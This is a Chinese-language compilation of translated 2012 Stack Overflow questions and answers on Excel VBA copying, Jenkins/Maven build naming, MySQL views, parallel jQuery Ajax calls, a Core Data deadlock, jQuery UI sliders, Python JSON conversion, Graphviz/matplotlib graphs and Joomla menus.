我发现类似于以下的代码，其中使用循环将一个工作簿中的数据移动到另一个工作簿。除了它移动的信息不正确之外，该代码有效。有人能告诉我为什么它一直复制最后一列 X 次（其中 X = 行数）吗？我只想将 A2 和 J11 之间的数据复制一次，而不是 J2 的 X 行和 J3 的 X 行，依此类推。

```
Sub CopySample()
Dim wb1 As Workbook, wb2 As Workbook
Dim ws1 As Worksheet, ws2 As Worksheet
Dim lCol As Range, lRow As Range
Dim CurCell_1 As Range, CurCell_2 As Range

Application.ScreenUpdating = False

'~~> Change as applicable
Set wb1 = Workbooks("Sample1.xlsm")
Set wb2 = Workbooks("OverallData_Month_X.xlsm")
Set ws1 = wb1.Sheets("SampleSheet")
Set ws2 = wb2.Sheets("All Cylinders Data") '<~~ Change as required

For Each lCol In ws1.Range("A2:J11")
'~~> Why this?
Set CurCell_2 = ws2.Range("A2:J2")
For Each lRow In ws1.Range("A2:J11")
    Set CurCell_1 = ws1.Cells(lRow.Row, lCol.Column)
    If Not IsEmpty(CurCell_1) Then
        CurCell_2.Value = CurCell_1.Value
        Set CurCell_2 = CurCell_2.Offset(1)
    End If
Next
Next

Application.ScreenUpdating = True
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:16:13.080

未经测试，但尝试将此行更改`Set CurCell_2 = ws2.Range("A2:J2")`为：

```
Set CurCell_2 = ws2.Cells(1, lCol.Column) 
```

**更新**

总的来说，上面的代码似乎将它的引用设置为工作簿的不同部分，并偏移（移动）这些引用。我认为有更有效的方法可以做到这一点，也有更简单的编码方法。所以虽然上面的答案只解决了你遇到的一半问题，但我已经在下面重写了你的代码，希望它能让你更了解+更新。

我相信下面的代码示例可以完成您想要完成的工作：

（代码中的注释）

```
Sub CopySample

Dim wb1 As Workbook, wb2 As Workbook
Dim ws1 As Worksheet, ws2 As Worksheet

Set wb1 = Workbooks("Sample1.xlsm")
Set wb2 = Workbooks("OverallData_Month_X.xlsm")
Set ws1 = wb1.Sheets("SampleSheet")
Set ws2 = wb2.Sheets("All Cylinders Data")

Dim rngCopyFromRange As Range
Set rngCopyFromRange = ws1.Range("A2:J11") '- name the copy range for ease of read

Dim rngPasteStartCell As Range
Set rngPasteStartCell = ws2.Range("A2") 'top left cellt o begin the paste

Dim lCurrentColumn As Long
Dim lCurrentRow As Long

    For lCurrentColumn = 1 To rngCopyFromRange.Columns.Count 'for each column in the source data
        For lCurrentRow = 1 To rngCopyFromRange.Rows.Count '-for each row in each column in source data
            'set the offset of the starting cell's value equal ot the top left cell in the source data offset by the same amount
            '- where the offsets are equal to the row/column we are on - 1
            rngPasteStartCell.Offset(lCurrentRow - 1, lCurrentColumn - 1).Value = _
                rngCopyFromRange.Cells(1, 1).Offset(lCurrentRow - 1, lCurrentColumn - 1).Value
        Next lCurrentRow
    Next lCurrentColumn

End Sub 
```

# maven - 将 Jenkins 构建名称设置为关联的 Maven 版本

> ID：12429762
> 
> 赞同：2
> 
> 时间：2012-09-14T18:08:16.100
> 
> 标签：maven, jenkins

我正在尝试设置 Jenkins，以便在它构建 Maven 作业时，它应该将该构建的构建名称设置为以某种方式包含该项目的 Maven 版本。如果我不能让它适用于所有版本，我希望它至少可以在 maven 版本上工作。

我研究了 Build Name Setter 插件（IMO 的功能相当不足）和 M2 Release 插件（我们已经在使用）。

我看到 Build Name Setter 插件可以访问环境变量，我正在考虑检查 M2 Release Plugin 是否设置了任何变量。

我还查看了关于 SO 的这个问题： [Getting Maven Version in Jenkins](https://stackoverflow.com/questions/9893503/getting-maven-version-in-jenkins)

这是一些有趣的信息...也许我可以修改 Build Name Setter 插件以使用其中列出的一些代码？

你们有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-21T20:00:15.930

我最终将代码添加到 M2 发布插件（开源 FTW），以提供在成功构建时将版本号附加到构建名称的选项。一周前我在 GitHub 上提出了一个 Pull 请求，但没有收到回复（这很好，这完全取决于他们），但我想我会为将来可能偶然发现此页面的任何人提及我的解决方案。

# mysql - 将两个 MySQL 视图合并为一个视图

> ID：12429763
> 
> 赞同：0
> 
> 时间：2012-09-14T18:08:15.763
> 
> 标签：mysql, view

我有两个工作 MySQL 视图：

第一个视图从表中选择所有行，`portfolio`其中 id 也在表`mural`中。

```
CREATE 
    ALGORITHM = UNDEFINED 
    DEFINER = `root`@`localhost` 
    SQL SECURITY DEFINER
VIEW `view_mural` AS
    select 
        `portfolio`.`id`                    AS `id`,
        `portfolio`.`customer_id`           AS `customer_id`,
        `portfolio`.`location_id`           AS `location_id`,
        `portfolio`.`title_text_id`         AS `title_text_id`,
        `portfolio`.`description_text_id`   AS `description_text_id`,
        `portfolio`.`started`               AS `started`,
        `portfolio`.`finished`              AS `finished`,
    from
        `portfolio`
    where
        `portfolio`.`id` in (select 
                `mural`.`portfolio_id`
            from
                `mural`) WITH CASCADED CHECK OPTION 
```

第二个视图从两个表中选择行：`portfolio`和`mural`。

```
CREATE 
    ALGORITHM = UNDEFINED 
    DEFINER = `root`@`localhost` 
    SQL SECURITY DEFINER
VIEW `view_mural` AS
    select 
        `portfolio`.`id`                                AS `id`,
        `portfolio`.`customer_id`                       AS `customer_id`,
        `portfolio`.`location_id`                       AS `location_id`,
        `portfolio`.`title_text_id`                     AS `title_text_id`,
        `portfolio`.`description_text_id`               AS `description_text_id`,
        `portfolio`.`started`                           AS `started`,
        `portfolio`.`finished`                          AS `finished`,
        (select 
            `mural`.`width` 
        from 
            `mural` 
        where 
            `mural`.`portfolio_id`=`portfolio`.`id`)    AS `mup`
    from
        `portfolio` 
```

我不知道如何将这些组合到一个视图中，以选择表，其中包含两个表中的列，其中包含表组合中的行，其中 id 也在表壁画中。

当我添加：

```
 where
        `portfolio`.`id` in (select 
                `mural`.`portfolio_id`
            from
                `mural`) WITH CASCADED CHECK OPTION 
```

在我的第二个视图的最后，它向我显示了一个错误：

```
Apply changes to view_mural Error 1368: CHECK OPTION on non-updatable view 'view_mural' SQL Statement:  CREATE       OR REPLACE ALGORITHM = UNDEFINED      DEFINER = `root`@`localhost`      SQL SECURITY DEFINER VIEW `view_mural` AS     select          `portfolio`.`id` AS `id`,         `portfolio`.`customer_id` AS `customer_id`,         `portfolio`.`location_id` AS `location_id`,         `portfolio`.`title_text_id` AS `title_text_id`,         `portfolio`.`description_text_id` AS `description_text_id`,         `portfolio`.`started` AS `started`,         `portfolio`.`finished` AS `finished`,         (select `mural`.`width` from `mural` where `mural`.`portfolio_id`=`portfolio`.`id`) AS `mup`     from         `portfolio`     where         `portfolio`.`id` in (select                  `mural`.`portfolio_id`             from                 `mural`) WITH CASCADED CHECK OPTION  Error when running failback script. Details follow. Error 1050: Table 'view_mural' already exists SQL Statement: CREATE ALGORITHM=UNDEFINED DEFINER=`root`@`localhost` SQL SECURITY DEFINER VIEW `view_mural` AS select `portfolio`.`id` AS `id`,`portfolio`.`customer_id` AS `customer_id`,`portfolio`.`location_id` AS `location_id`,`portfolio`.`title_text_id` AS `title_text_id`,`portfolio`.`description_text_id` AS `description_text_id`,`portfolio`.`started` AS `started`,`portfolio`.`finished` AS `finished`,(select `mural`.`width` from `mural` where ((`mural`.`portfolio_id` = `portfolio`.`id`) and `portfolio`.`id` in (select `mural`.`portfolio_id` from `mural`))) AS `mup` from `portfolio` 
```

有人可以指出我该怎么做吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:18:53.800

了解[SQL 连接](http://www.codinghorror.com/blog/2007/10/a-visual-explanation-of-sql-joins.html)：

```
SELECT
    portfolio.id,
    portfolio.customer_id,
    portfolio.location_id,
    portfolio.title_text_id,
    portfolio.description_text_id,
    portfolio.started,
    portfolio.finished,
    mural.width
FROM
    portfolio JOIN mural ON mural.portfolio_id = portfolio.id 
```

# javascript - Javascript/jQuery 中的并行 Ajax 调用

> ID：12429765
> 
> 赞同：14
> 
> 时间：2012-09-14T18:08:17.277
> 
> 标签：javascript, jquery, html, ajax

我对 Javascript/jquery 世界完全陌生，需要一些帮助。现在，我正在编写一个 html 页面，我必须在其中进行 5 次不同的 Ajax 调用来获取数据以绘制图形。现在，我这样调用这 5 个 ajax 调用：

```
$(document).ready(function() {
    area0Obj = $.parseJSON($.ajax({
        url : url0,
        async : false,
        dataType : 'json'
    }).responseText);

    area1Obj = $.parseJSON($.ajax({
        url : url1,
        async : false,
        dataType : 'json'
    }).responseText);
.
.
.
    area4Obj = $.parseJSON($.ajax({
        url : url4,
        async : false,
        dataType : 'json'
    }).responseText);

    // some code for generating graphs

)} // closing the document ready function 
```

我的问题是，在上述情况下，所有的 ajax 调用都是连续进行的。也就是说，在 1 次调用完成后 2 次启动，当 2 次完成时 3 次启动，依此类推.. 每个 Ajax 调用大约需要 5-6 秒来获取数据，这使得整个页面在大约 30 秒内加载.

我尝试将异步类型设置为 true，但在这种情况下，我没有立即获取数据来绘制违背我的目的的图表。

我的问题是：如何使这些调用并行，以便我开始并行获取所有这些数据并且可以在更短的时间内加载我的页面？

提前致谢。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-09-14T19:21:04.917

使用[jQuery.when](http://api.jquery.com/jQuery.when/)（延迟）：

```
$.when( $.ajax("/req1"), $.ajax("/req2"), $.ajax("/req3") ).then(function(resp1, resp2, resp3){ 
    // plot graph using data from resp1, resp2 & resp3 
}); 
```

回调函数仅在所有 3 个 ajax 调用都完成时调用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T18:15:13.863

您不能使用`async: false`- 代码同步执行，正如您已经知道的那样（即，直到前一个操作完成，操作才会开始）。
你会想要设置`async: true`（或者只是省略它——默认情况下它是真的）。然后为每个 AJAX 调用定义一个回调函数。在每个回调中，将接收到的数据添加到数组中。然后，检查是否所有数据都已加载（`arrayOfJsonObjects.length == 5`）。如果有，请调用一个函数来对数据执行任何操作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T18:34:51.120

让我们尝试以这种方式进行：

```
<script type="text/javascript" charset="utf-8">
    $(document).ready(function() {
        var area0Obj = {responseText:''};
        var area1Obj = {responseText:''};
        var area2Obj = {responseText:''};

        var url0 = 'http://someurl/url0/';
        var url1 = 'http://someurl/url1/';
        var url2 = 'http://someurl/url2/';

        var getData = function(someURL, place) {
            $.ajax({
                type     : 'POST',
                dataType : 'json',
                url      : someURL,
                success  : function(data) {
                    place.responseText = data;
                    console.log(place);
                }
            });
        }

        getData(url0, area0Obj);
        getData(url1, area1Obj);
        getData(url2, area2Obj);

    }); 
</script> 
```

如果服务器端将是 smth。像这样：

```
public function url0() {
    $answer = array(
        array('smth' => 1, 'ope' => 'one'),
        array('smth' => 8, 'ope' => 'two'),
        array('smth' => 5, 'ope' => 'three')
    );
    die(json_encode($answer));
}

public function url1() {
    $answer = array('one','two','three');
    die(json_encode($answer));
}

public function url2() {
    $answer = 'one ,two, three';
    die(json_encode($answer));
} 
```

因此，如您所见，创建了一个函数 getData() 用于从服务器获取数据，然后调用了 3 次。结果将以异步方式接收，例如，第一个可以得到第三个呼叫的答案，最后一个可以得到第一个呼叫。

控制台答案将是：

```
[{"smth":1,"ope":"one"},{"smth":8,"ope":"two"},{"smth":5,"ope":"three"}]

["one","two","three"]

"one ,two, three" 
```

PS。请阅读：[http](http://api.jquery.com/jQuery.ajax/) ://api.jquery.com/jQuery.ajax/在那里您可以清楚地看到有关异步的信息。默认异步参数值 = true。

默认情况下，所有请求都是异步发送的（即默认设置为true）。如果您需要同步请求，请将此选项设置为 false。跨域请求和 dataType: "jsonp" 请求不支持同步操作。请注意，同步请求可能会暂时锁定浏览器，在请求处于活动状态时禁用任何操作...

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-09-25T15:01:38.337

以下对我有用 - 我有多个需要传递序列化对象的 ajax 调用：

```
 var args1 = {
        "table": "users",
        "order": " ORDER BY id DESC ",
        "local_domain":""
    }
    var args2 = {
        "table": "parts",
        "order": " ORDER BY date DESC ",
        "local_domain":""
    }

    $.when(
        $.ajax({
                url: args1.local_domain + '/my/restful',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                type: "POST",
                dataType : "json",
                contentType: "application/json; charset=utf-8",
                data : JSON.stringify(args1),
                error: function(err1) {
                    alert('(Call 1)An error just happened...' + JSON.stringify(err1));
                }
            }),
        $.ajax({
            url: args2.local_domain + '/my/restful',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            type: "POST",
            dataType : "json",
            contentType: "application/json; charset=utf-8",
            data : JSON.stringify(args2),
            error: function(err2) {
                calert('(Call 2)An error just happened...' + JSON.stringify(err2));
            }
        })                     

    ).then(function( data1, data2 ) {
        data1 = cleanDataString(data1);
        data2 = cleanDataString(data2);

        data1.forEach(function(e){
            console.log("ids" + e.id)
        });
        data2.forEach(function(e){
            console.log("dates" + e.date)
        });

    })

    function cleanDataString(data){
            data = decodeURIComponent(data);
            // next if statement was only used because I got additional object on the back of my JSON object
            // parsed it out while serialised and then added back closing 2 brackets
            if(data !== undefined && data.toString().includes('}],success,')){ 
                temp = data.toString().split('}],success,');
                data = temp[0] + '}]';
            }
            data = JSON.parse(data);
            return data;                    // return parsed object
      } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-14T18:14:42.753

在 jQuery.ajax 中，您应该提供如下回调方法：

```
j.ajax({
        url : url0,
        async : true,
        dataType : 'json',
        success:function(data){
             console.log(data);
        }
    } 
```

或者你可以直接使用

```
jQuery.getJSON(url0, function(data){
  console.log(data);
}); 
```

[参考](http://api.jquery.com/jQuery.getJSON/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-14T18:19:57.320

您将无法像您的示例那样处理它。设置为异步使用另一个线程发出请求并让您的应用程序继续。

在这种情况下，您应该使用一个新函数来绘制一个区域，然后使用 ajax 请求的回调函数将数据传递给该函数。

例如：

```
$(document).ready(function() {
    function plotArea(data, status, jqXHR) {
      // access the graph object and apply the data.
      var area_data = $.parseJSON(data);
    }

    $.ajax({
        url : url0,
        async : false,
        dataType : 'json',
        success: poltArea
    });

    $.ajax({
        url : url1,
        async : false,
        dataType : 'json',
        success: poltArea
    });

    $.ajax({
        url : url4,
        async : false,
        dataType : 'json',
        success: poltArea
    });

    // some code for generating graphs

}); // closing the document ready function 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-09-14T18:23:18.970

看起来您需要异步分派您的请求并定义一个回调函数来获取响应。

就像你做的那样，它会等到变量被成功分配（意思是：响应刚刚到达），直到它继续分派下一个请求。只需使用这样的东西。

```
$.ajax({
  url: url,
  dataType: 'json',
  data: data,
  success: function(data) {
     area0Obj = data;
  }
}); 
```

这应该可以解决问题。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-09-14T18:35:28.977

您可以将不同 ajax 函数的所有功能组合成 1 个 ajax 函数，或者从 1 个 ajax 函数调用其他函数（在这种情况下它们将是私有/控制器端），然后返回结果。Ajax 调用确实有点停滞，所以尽量减少它们是要走的路。

您还可以使 ajax 函数异步（然后将像普通函数一样运行），然后您可以在所有函数返回它们的数据后最后渲染图形。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-09-14T18:35:45.947

这是您的问题的解决方案：http: [//jsfiddle.net/YZuD9/](http://jsfiddle.net/YZuD9/)

# multithreading - Core Data 私有队列死锁

> ID：12429767
> 
> 赞同：3
> 
> 时间：2012-09-14T18:08:26.213
> 
> 标签：multithreading, core-data, deadlock

我有一个后台线程做一些处理，并保存到核心数据。在我的应用程序委托中`applicationShouldTerminate`，我等待后台线程完成其工作时释放的信号量。这是为了避免在工作过程中杀死线程并使事情处于不一致的状态。

不幸的是，这会导致死锁。以下是后台作业的运行方式：

```
_context = [[NSManagedObjectContext alloc] initWithConcurrencyType:NSPrivateQueueConcurrencyType];
[_context setParentContext:_parentContext];

[_context performBlock:
^{
    // ... long-running task here ...

    NSError * error;
    [_context save:&error]; // deadlock here if main thread is waiting on semaphore

    // ... release semaphore here ...
}]; 
```

如果用户在后台线程仍在工作时退出应用程序，它就会死锁。问题似乎是`[_context save:&error]`正在调用`dispatch_sync`（或等效的）主线程 - 但主线程已经在等待该线程释放信号量，因此无法运行该块。

由于子上下文保存似乎阻塞在主线程上，如何实现这种模式（主线程等待子完成并保存其上下文）？

主线程：

```
#0  0x00007fff882e96c2 in semaphore_wait_trap ()
#1  0x00007fff876264c2 in _dispatch_semaphore_wait_slow ()
#2  0x00000001001157fb in +[IndxCore waitForBackgroundJobs] at /Users/mspong/dev/Indx/IndxCore/IndxCore/IndxCore.m:48
#3  0x00000001000040c6 in -[RHAppDelegate applicationShouldTerminate:] at /Users/mspong/dev/Indx/Indx/Indx/RHAppDelegate.m:324
#4  0x00007fff9071a48f in -[NSApplication _docController:shouldTerminate:] ()
#5  0x00007fff9071a39e in __91-[NSDocumentController(NSInternal) _closeAllDocumentsWithDelegate:shouldTerminateSelector:]_block_invoke_0 ()
#6  0x00007fff9071a23a in -[NSDocumentController(NSInternal) _closeAllDocumentsWithDelegate:shouldTerminateSelector:] ()
(snip)
#17 0x00007fff9048e656 in NSApplicationMain ()
#18 0x0000000100001e72 in main at /Users/mspong/dev/Indx/Indx/Indx/main.m:13
#19 0x00007fff8c4577e1 in start () 
```

后台线程：

```
#0  0x00007fff882e96c2 in semaphore_wait_trap ()
#1  0x00007fff87627c6e in _dispatch_thread_semaphore_wait ()
#2  0x00007fff87627ace in _dispatch_barrier_sync_f_slow ()
#3  0x00007fff8704a78c in _perform ()
#4  0x00007fff8704a5d2 in -[NSManagedObjectContext(_NestedContextSupport) executeRequest:withContext:error:] ()
#5  0x00007fff8702c278 in -[NSManagedObjectContext save:] ()
#6  0x000000010011640d in __22-[Indexer updateIndex]_block_invoke_0 at /Users/mspong/dev/Indx/IndxCore/IndxCore/Indexer/Indexer.m:70
#7  0x00007fff87079b4f in developerSubmittedBlockToNSManagedObjectContextPerform_privateasync ()
#8  0x00007fff876230fa in _dispatch_client_callout ()
#9  0x00007fff876244c3 in _dispatch_queue_drain ()
#10 0x00007fff87624335 in _dispatch_queue_invoke ()
#11 0x00007fff87624207 in _dispatch_worker_thread2 ()
#12 0x00007fff88730ceb in _pthread_wqthread ()
#13 0x00007fff8871b1b1 in start_wqthread () 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-16T15:39:12.593

在`applicationShouldTerminate:`您可以返回`NSTerminateLater`延迟终止，直到后台上下文完成保存操作。

保存完成后，您调用

```
[[NSApplication sharedApplication] replyToApplicationShouldTerminate:YES]; 
```

退出应用程序。

# javascript - 阻止 jQuery UI 滑块移动超过给定值？

> ID：12429773
> 
> 赞同：1
> 
> 时间：2012-09-14T18:08:40.917
> 
> 标签：javascript, jquery, jquery-ui, slider, jquery-ui-slider

在我的页面上，我有几个滑块。它们都需要相同的比例，但其中一些达到 150，有些达到 200。我想将它们的最大值设置为 200，但防止其中一些移动超过 150。它们是不同的 $() .slider() 调用，所以我只是对如何将滑块的最大值设置为 200 感兴趣，但不允许超过 150 的任何移动......

我认为这种行为是内置的，但显然不是？

仅供参考：我使用 range: "min" 作为这些滑块。

**编辑**

[http://jsfiddle.net/D9nAx/1/](http://jsfiddle.net/D9nAx/1/)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-14T19:09:12.940

使用幻灯片事件：

```
$( "#slider-vertical" ).slider({
    orientation: "vertical",
    range: "min",
    min: 0,
    max: 200,
    value: 60,
    slide: function( event, ui ) {
        if(ui.value> 150)
            return false;
        $( "#amount" ).val( ui.value );
    }
}); 
```

小提琴：http: [//jsfiddle.net/dvz8E](http://jsfiddle.net/dvz8E)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T19:18:48.767

```
$( "#slider-vertical" ).slider({
    orientation: "vertical",
    range: "min",
    min: 0,
    max: 200,
    value: 60,
    slide: slide
});
function slide(event, ui){
    var result = true;
    if (ui.value > 150){
        $(this).slider( "value" , 150 );
        result = false;
    }
    $( "#amount" ).val( $(this).slider( "value") );
    return result;
} 
```

[http://jsfiddle.net/D9nAx/2/](http://jsfiddle.net/D9nAx/2/)

# python - 如何将邻接矩阵转换为链接列表

> ID：12429774
> 
> 赞同：-2
> 
> 时间：2012-09-14T18:08:56.603
> 
> 标签：python, json, list

如何仅使用基本工具和实用程序将 python 列表转换为 JSON 格式，并包含特定的“名称”、“组”、“源”、“目标”键名等？构造该格式基本上是很多字符串连接吗？

列表索引表示连通性，例如列表中的索引 0 连接到索引 1、3、4、5、6、7、8、9 和 1 连接到 0、2、3、4、5、6、7、8 , 9

列表：

```
[[1, 3, 4, 5, 6, 7, 8, 9], [0, 2, 3, 4, 5, 6, 7, 8, 9], [1, 3, 4, 7, 9], [0, 1, 2, 4, 5, 6, 7, 9], [0, 1, 2, 3, 6, 7, 8], [0, 1, 3, 6, 7, 8, 9], [0, 1, 3, 4, 5, 7, 8, 9], [0, 1, 2, 3, 4, 5, 6, 8, 9], [0, 1, 4, 5, 6, 7, 9], [0, 1, 2, 3, 5, 6, 7, 8]] 
```

变成这样的 JSON 格式？

```
 {"nodes":
[
{"name":"Zone1","group":0},
{"name":"Zone2","group":1},
{"name":"Zone3","group":2},
{"name":"Zone4","group":3},
{"name":"Zone5","group":4},
{"name":"Zone6","group":5},
{"name":"Zone7","group":6},
{"name":"Zone8","group":7},
{"name":"Zone9","group":8},
{"name":"Zone10","group":9}
],
"links":[
{"source":0,"target":1},
{"source":0,"target":3},
{"source":0,"target":4},
{"source":0,"target":5},
{"source":0,"target":6},
{"source":0,"target":7},
{"source":0,"target":8},
{"source":0,"target":9},
{"source":1,"target":0},
{"source":1,"target":2},
{"source":1,"target":3},
{"source":1,"target":4},
{"source":1,"target":5},
{"source":1,"target":6},
{"source":1,"target":7},
{"source":1,"target":8},
{"source":1,"target":9},
{"source":2,"target":1},
{"source":2,"target":3},
{"source":2,"target":4},
{"source":2,"target":7},
{"source":2,"target":9},
{"source":3,"target":0},
{"source":3,"target":1},
{"source":3,"target":2},
{"source":3,"target":4},
{"source":3,"target":5},
{"source":3,"target":6},
{"source":3,"target":7},
{"source":3,"target":9},
{"source":4,"target":0},
{"source":4,"target":1},
{"source":4,"target":2},
{"source":4,"target":3},
{"source":4,"target":6},
{"source":4,"target":7},
{"source":4,"target":8},
{"source":5,"target":0},
{"source":5,"target":1},
{"source":5,"target":3},
{"source":5,"target":6},
{"source":5,"target":7},
{"source":5,"target":8},
{"source":5,"target":9},
{"source":6,"target":0},
{"source":6,"target":1},
{"source":6,"target":3},
{"source":6,"target":4},
{"source":6,"target":5},
{"source":6,"target":7},
{"source":6,"target":8},
{"source":6,"target":9},
{"source":7,"target":0},
{"source":7,"target":1},
{"source":7,"target":2},
{"source":7,"target":3},
{"source":7,"target":4},
{"source":7,"target":5},
{"source":7,"target":6},
{"source":7,"target":8},
{"source":7,"target":9},
{"source":8,"target":0},
{"source":8,"target":1},
{"source":8,"target":4},
{"source":8,"target":5},
{"source":8,"target":6},
{"source":8,"target":7},
{"source":8,"target":9},
{"source":9,"target":0},
{"source":9,"target":1},
{"source":9,"target":2},
{"source":9,"target":3},
{"source":9,"target":5},
{"source":9,"target":6},
{"source":9,"target":7},
{"source":9,"target":8}
]} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T18:10:03.293

做就是了：

```
import json
myjson = json.dumps(mylst) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T18:24:57.960

从输入和输出猜测，这可能是您想要的。

```
import json
def convert(adj_lst):
    links = []
    for i,adj in enumerate(adj_lst):
        links.extend( [{'source':i,'target':n} for n in adj] )
    nodes = [{"name":"Zone%d" % i, "group":i} for i in xrange(len(adj_lst))]
    return {"nodes":nodes, "links":links}

adj_list = [[1, 3, 4, 5, 6, 7, 8, 9], [0, 2, 3, 4, 5, 6, 7, 8, 9], [1, 3, 4, 7, 9], [0, 1, 2, 4, 5, 6, 7, 9], [0, 1, 2, 3, 6, 7, 8], [0, 1, 3, 6, 7, 8, 9], [0, 1, 3, 4, 5, 7, 8, 9], [0, 1, 2, 3, 4, 5, 6, 8, 9], [0, 1, 4, 5, 6, 7, 9], [0, 1, 2, 3, 5, 6, 7, 8]]
print json.dumps(convert(adj_list), indent=2) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T18:10:02.407

使用该[`json`](http://docs.python.org/library/json.html)模块，您应该可以轻松地对列表进行编码。

正如大卫建议的那样

`json.dumps`和

`json.loads`从json转向python。Python 提供了出色的文档，在谷歌中输入像“python json”这样的未优化搜索提供了适当的链接作为第一个搜索结果

# mfi - Apple 的 MFI - ATS 盒子没有响应初始化请求

> ID：12429776
> 
> 赞同：1
> 
> 时间：2012-09-14T18:09:16.863
> 
> 标签：mfi

你们能帮帮我吗？

我买了一个 ATS 盒子 + Beagle USB 480 + Avinet 的 USB 分线板，来测试一些 MFI 开发。

它工作没有问题（在他使用一开始就解决了一些连接问题），为期两周。

今天，我们尝试在这里运行一些测试，但是 ATS 软件崩溃了，试图更新 ATS 盒子固件。

由于发生了这个问题，当我们尝试运行 ATS sw 的“Capture”功能时，我们会收到以下消息：

> ATS Box 没有响应初始化请求

很奇怪，因为 ATS sw 找到了附加到 Mac 的 ATS Box 和 Beagle，但无法初始化 ATS Box。

我想，当 ATS sw 崩溃时，试图更新 ATS 盒子固件，固件本身已损坏。问题是我不知道如何重新安装 ATS 盒子固件。

为了完成这个场景，我在 MacBook Air (Mac OS X 10.7.3) 上运行 ATS sw。

有人可以帮我吗？我如何识别问题并解决它？

# datetime - 在python中绘制时空图

> ID：12429778
> 
> 赞同：0
> 
> 时间：2012-09-14T18:09:23.437
> 
> 标签：datetime, graph, matplotlib, graphviz, space

我正在搜索一个绘制时空图的示例。我浏览了 Graphviz，但找不到相关示例。我必须绘制一个计算机网络图，假设网络在 10 秒后发生变化。我可以绘制一个场景，但现在我需要将在不同时间获得的不同图表组合为时空图。我正在使用 python 进行绘图但是任何使用 Graphviz、matplotlib、networkx 等工具的相关示例都会有所帮助。

因此，我们非常感谢任何有关这方面的建议和指导。

谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-15T17:27:56.893

我会使用`matplotilb`. 这是最少的代码。使用散点图而不是单独的点图和`NaN`不连续线玩游戏可能更有效，但这会奏效。有关椭圆示例，请参见[此处](http://matplotlib.org/examples/pylab_examples/ellipse_demo.html)。 `text` [文档](http://matplotlib.org/api/pyplot_api.html#matplotlib.pyplot.text)，或者如果您想成为更高级的注释[文档](http://matplotlib.org/api/pyplot_api.html#matplotlib.pyplot.annotate)。

```
import matplotlib.pyplot as plt
import numpy as np

def plot_level(ax,t,location_map, link_pairs,shift_scale = 10):
    # add some code that adds the ellipse + time label    
    shift = np.array([0,t*shift_scale])

    # plot nodes + labels
    for key in location_map:
        pt_location = location_map[key] + shift
        ax.plot(pt_location[0],pt_location[1],'ok')
        ax.text(pt_location[0],pt_location[1],key + "%d"%t) # play with this to make it look good

    # plot connections
    for a,b in link_pairs:
        ax.plot(*(np.vstack((location_map[a],location_map[b])) + shift.T).T,color='k')
    plt.draw()

location_map = {}
location_map['A'] = np.array([0,0])
location_map['B'] = np.array([1,1])
location_map['C'] = np.array([2,0])
location_map['D'] = np.array([3,1])

link_pairs1 = [('A','B')]
link_pairs2 = [('B','C')]

fig = plt.figure()
ax = plt.gca()
ax.yaxis.set_visible(False)
ax.xaxis.set_visible(False)
# function_that_draws_axes_marker
plot_level(gca(),0,location_map,[])
plot_level(gca(),1,location_map,link_pairs1)
plot_level(gca(),2,location_map,link_pairs2)
# function_that_draws_vertical_lines(t_range,location_map,shift_scale=10) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-16T12:28:34.120

谢谢 tcaswell 的回复。我已经做了一些事情，所以如果我不能那样做，我会深入研究你建议的方式。现在我有： ![在此处输入图像描述](../Images/2a1eb6b8113c42c2b3afd0d144f8c2c5.png)

但我想要这样的东西：

![在此处输入图像描述](../Images/f46c6b637637b12aa9a512be904b09bd.png)

GraphViz 用于创建此图像的 .dot 文件代码：

```
graph {
    rankdir=LR;
    subgraph cluster01 {
        label="t=0"
        a0 [label="A"];
        a1 [label="B"];
        a2 [label="C"];
        a5 [label="E"];
        a0 -- a1;
        a1 -- a2 ;
        a2 -- a0;
    };

    subgraph cluster02
    {
        label="t=10"
        b0 [label="A"];
        b5 [label="E"];
        b1 [label="B"];
        b2 [label="C"];

        b0 -- b1;
        b2 -- b5;
    };

    a0--b0 [style=dotted];
    a1--b1 [style=dotted];
    a2--b2 [style=dotted];
    a5--b5 [style=dotted];
} 
```

我认为我无法正确使用“rankdir”。

# php - Joomla 从参数获取菜单 ID

> ID：12429779
> 
> 赞同：1
> 
> 时间：2012-09-14T18:09:34.287
> 
> 标签：php, joomla

我有 2 个参数： filter_town_id filter_transaction_type

我想获得菜单 ID 相同的参数

现在我使用循环，但我认为这是最好的解决方案。

```
$menus = &JSite::getMenu();
$filter_town_id=$row->town_id;
$filter_transaction_type=$row->transaction_type;
for ($i=1; ; $i++)
{
    $params = $menus->getParams($i);
    $town = $params->get('filter_town_id');
    $type=$params->get('filter_transaction_type');
    if ($filter_town_id==$town&$filter_transaction_type==$type)
    {
        $itemid=$i;
        break;
    }
} 
```

$url = JRoute::_('index.php?option=com_component&view=view&id='.$row->slug.'&Itemid='.$itemid);

# r - R-请帮忙。无法将循环写入滞后日期

> ID：12429781
> 
> 赞同：2
> 
> 时间：2012-09-14T18:09:42.107
> 
> 标签：r, date, loops, for-loop, lag

